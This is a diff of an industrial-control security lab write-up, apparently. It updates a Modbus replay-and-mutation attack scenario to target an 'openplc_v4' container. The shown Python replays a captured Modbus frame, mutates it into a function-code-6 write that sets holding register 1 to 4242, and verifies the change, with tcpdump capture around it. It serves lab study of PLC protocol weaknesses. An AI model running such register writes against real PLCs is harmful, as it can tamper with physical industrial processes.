@@ -3,7 +3,7 @@
 **Date:** 2026-05-22
 **Source task:** Phase 2 attack scenarios (step 2 of Phase 2)
 **Attacker vantage:** `otlab-attacker` multi-homed on `ot_zone`
-(`172.18.0.4`), target `openplc:502` (`172.18.0.2`).
+(`172.18.0.4`), target `openplc_v4:502` (`172.18.0.5`).
 **Source artifact:** pre-flight baseline pcap
 `captures/phase2-baseline-clean-2026-05-22.pcap`, captured before
 the attacker crossed the boundary.
@@ -19,7 +19,7 @@ can an attacker take a legitimate, captured PDU and reuse it? Can
 they mutate it before reuse? The answers are independent of the
 access-control story.
 
-Capture vantage: `tcpdump -i any` inside `otlab-openplc`. Filter
+Capture vantage: `tcpdump -i any` inside `otlab-openplc-v4`. Filter
 `'tcp port 502'`.
 
 ---
@@ -56,7 +56,7 @@ design (`docs/network-security.md` §5.2). Concretely:
 docker cp ./captures/phase2-baseline-clean-2026-05-22.pcap \
   otlab-attacker:/tmp/baseline.pcap
 
-docker exec -d otlab-openplc sh -c \
+docker exec -d otlab-openplc-v4 sh -c \
   "tcpdump -i any -U -w /tmp/scenario-5.pcap 'tcp port 502'"
 sleep 2
 
@@ -79,7 +79,7 @@ print(f"CAPTURED from {src_ip}: {captured.hex()}  (TID=0x{tid:04x} FC={fc})")
 
 # Step 1: verbatim replay
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(('openplc', 502))
+s.connect(('openplc_v4', 502))
 s.send(captured)
 resp = s.recv(1024)
 print(f"REPLAY response: {resp.hex()}  TID=0x{int.from_bytes(resp[0:2],'big'):04x}")
@@ -91,7 +91,7 @@ mutated[7]    = 6                               # FC -> 6
 mutated[8:10] = (1).to_bytes(2, 'big')          # addr = HR1
 mutated[10:12] = (4242).to_bytes(2, 'big')      # value = 4242
 s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s2.connect(('openplc', 502))
+s2.connect(('openplc_v4', 502))
 s2.send(bytes(mutated))
 resp2 = s2.recv(1024)
 print(f"MUTATED response: {resp2.hex()}  FC={resp2[7]}")
@@ -99,7 +99,7 @@ s2.close()
 
 # Step 3: read HR1 immediately to confirm reassertion
 s3 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s3.connect(('openplc', 502))
+s3.connect(('openplc_v4', 502))
 s3.send(b'\x00\x42\x00\x00\x00\x06\x01\x03\x00\x01\x00\x01')  # FC3 read HR1
 rb = s3.recv(1024)
 print(f"VERIFY HR1 = {int.from_bytes(rb[9:11], 'big')}")
@@ -107,8 +107,8 @@ s3.close()
 PY
 
 sleep 3
-docker exec otlab-openplc pkill tcpdump
-docker cp otlab-openplc:/tmp/scenario-5.pcap \
+docker exec otlab-openplc-v4 pkill tcpdump
+docker cp otlab-openplc-v4:/tmp/scenario-5.pcap \
   ./captures/phase2-scenario-5-replay-2026-05-22.pcap
 ```
 
